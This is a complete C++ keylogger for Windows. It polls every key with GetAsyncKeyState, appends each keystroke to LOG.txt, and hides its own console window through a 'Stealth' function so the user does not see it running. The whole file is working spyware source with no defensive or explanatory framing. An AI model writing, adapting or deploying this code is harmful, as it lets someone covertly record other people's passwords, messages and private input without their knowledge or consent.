#include <iostream>
#include <windows.h>

using namespace std;

int Save(int key_stroke, char *file);
void Stealth();

int main(){
    Stealth();

    while (true) {
        for (char i = 8; i <= 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                Save(i, "LOG.txt");
            }
        }
    }

    system("PAUSE");
    return 0;
}

int Save(int key_stroke, char *file){
    if (key_stroke == 1 || key_stroke == 2) {
        return 0;
    }

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    if (OUTPUT_FILE == NULL) {
        return 1;
    }

    cout << key_stroke << endl;
    fprintf(OUTPUT_FILE, "%c", key_stroke);
    fclose(OUTPUT_FILE);
    return 0;
}

void Stealth(){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);
}